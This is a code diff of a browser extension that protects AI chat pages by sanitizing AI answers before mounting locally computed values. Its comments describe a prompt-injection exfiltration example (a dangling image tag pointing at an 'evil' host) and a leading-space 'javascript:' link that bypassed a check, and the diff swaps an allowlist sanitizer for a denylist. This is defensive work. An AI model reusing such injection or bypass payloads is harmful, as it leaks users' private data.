@@ -546,7 +546,7 @@
   // click on it ran the guard; DeepSeek's send arrow (a div) matched nothing, so clicking it sent
   // the message without protection.
   const SEND_BUTTONS = [
-    "button[data-testid='send-button']",                       // ChatGPT
+    "button[data-testid='send-button']",                       // ChatGPT (older; Oct 2026 it is aria-label "Send", below)
     "button[data-testid='chat-input-send']",                   // Claude
     "button[aria-label='Send message']", "button[aria-label='Send prompt']",
     "div[role='button'].ds-button--primary.ds-button--circle", // DeepSeek
@@ -661,30 +661,32 @@
   }
 
   /**
-   * Mounts locally computed badges. The input is the AI's answer text (which a prompt injection can
-   * fill with markup, e.g. a dangling <img src='https://evil/? that would carry the computed real
-   * value off) with our badge spans spliced in. Allowlist: only our own badge spans stay elements,
-   * with only class/data-expr/title; any other markup goes back to the plain text it was on screen.
+   * Mounts locally computed badges into an answer. The input is the answer's own HTML (innerHTML,
+   * so anything the AI wrote as text arrives escaped) or escaped formula text (escapeHtml below),
+   * with our badge spans spliced in. Second line of defence anyway: no executable or embedding
+   * tags, no on* handlers, and links/sources only to http(s), # or / (a " javascript:" with a
+   * leading space used to get past a startsWith check).
    */
-  const BADGE_CLASSES = ["ss-local-compute", "ss-katex-hydrated"];
-  const BADGE_ATTRS = ["class", "data-expr", "title"];
+  const DANGEROUS_TAGS = "script, iframe, frame, object, embed, style, link, meta, base, form, svg, math, template, noscript";
+  const URL_ATTRS = ["href", "src", "srcset", "action", "formaction", "xlink:href", "poster", "background", "data"];
   function sanitizeAndMountHydration(node, htmlStr) {
     try {
       const doc = new DOMParser().parseFromString(htmlStr, "text/html");
-      const clean = (parent) => {
-        for (const el of Array.from(parent.children)) {
-          const isBadge = el.tagName === "SPAN" && BADGE_CLASSES.some(c => el.classList.contains(c));
-          if (!isBadge) { el.replaceWith(doc.createTextNode(el.outerHTML)); continue; }
-          for (const a of Array.from(el.attributes)) if (!BADGE_ATTRS.includes(a.name)) el.removeAttribute(a.name);
-          clean(el);
+      doc.body.querySelectorAll(DANGEROUS_TAGS).forEach(el => el.remove());
+      for (const el of doc.body.querySelectorAll("*")) {
+        for (const a of Array.from(el.attributes)) {
+          const name = a.name.toLowerCase();
+          const bad = name.startsWith("on") || name === "srcdoc" ||
+            (URL_ATTRS.includes(name) && !/^(?:https?:|#|\/(?!\/))/i.test(a.value.trim()));
+          if (bad) el.removeAttribute(a.name);
         }
-      };
-      clean(doc.body);
+      }
       node.replaceChildren(...doc.body.childNodes);
     } catch (_) {
       // Leave the answer as it was rather than mount anything unchecked
     }
   }
+  const escapeHtml = (s) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 
   const MESSAGE_SELECTOR = "[data-markdown-text-style='assistant-message'], [data-message-author-role='assistant'], " +
     ".font-claude-message, .font-claude-response, div.ds-markdown";
@@ -801,7 +803,8 @@
         tex = kNode.textContent || "";
       }
       if (tex && isSymbolicMathContent(tex)) {
-        const res = localCompute.hydrateText(tex, vaultData, true);
+        // tex is decoded text (the AI controls it): escape it before it becomes HTML
+        const res = localCompute.hydrateText(escapeHtml(tex), vaultData, true);
         if (res.computedCount > 0) {
           const wrapper = document.createElement("span");
           wrapper.className = "ss-katex-hydrated";
